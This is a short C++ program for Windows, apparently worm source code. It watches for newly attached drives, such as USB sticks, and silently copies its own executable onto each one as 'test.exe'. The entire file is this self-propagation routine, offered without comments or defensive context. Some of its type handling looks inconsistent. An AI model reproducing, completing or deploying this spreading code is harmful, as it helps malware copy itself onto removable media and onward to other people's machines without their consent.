#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <string>

#pragma comment(lib, "legacy_stdio_definitions.lib")

std::string allDrives;

char getRemovableDisk() {
    char drive = '0';

    WCHAR szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);

    std::string currentDrives = "";

    for (int i = 0; i < dwResult; i++) {
        if (szLogicalDrives[i] > 64 && szLogicalDrives[i] < 90) {
            currentDrives.append(1, szLogicalDrives[i]);
            if (allDrives.find(szLogicalDrives[i]) > 100) {
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

bool copyItself(const TCHAR* destination, const TCHAR* filename) {
    TCHAR szModuleName[MAX_PATH];
    TCHAR szDestination[MAX_PATH];

    if (!GetModuleFileName(NULL, szModuleName, MAX_PATH)) {
        std::cerr << "Failed to get the path of the current executable." << std::endl;
        return false;
    }

    // Copy the destination path
    _tcscpy_s(szDestination, MAX_PATH, destination);
    _tcscat_s(szDestination, MAX_PATH, filename);

    if (!CopyFile(szModuleName, szDestination, FALSE)) {
        std::cerr << "Failed to copy the file." << std::endl;
        return false;
    }

    std::wcout << L"Program copied successfully to " << szDestination << std::endl;
    return true;
}

int main() {
    char driveLetter = getRemovableDisk();
    while (1) {
        driveLetter = getRemovableDisk();
        if (driveLetter != '0') {
            printf("%c \n", driveLetter);

            std::string drivePath = std::string(1, driveLetter) + ":\\";

            std::wstring wideDrivePath = std::wstring(drivePath.begin(), drivePath.end());
            copyItself(wideDrivePath.c_str(), TEXT("\\test.exe"));
        }

        Sleep(1000);
    }
}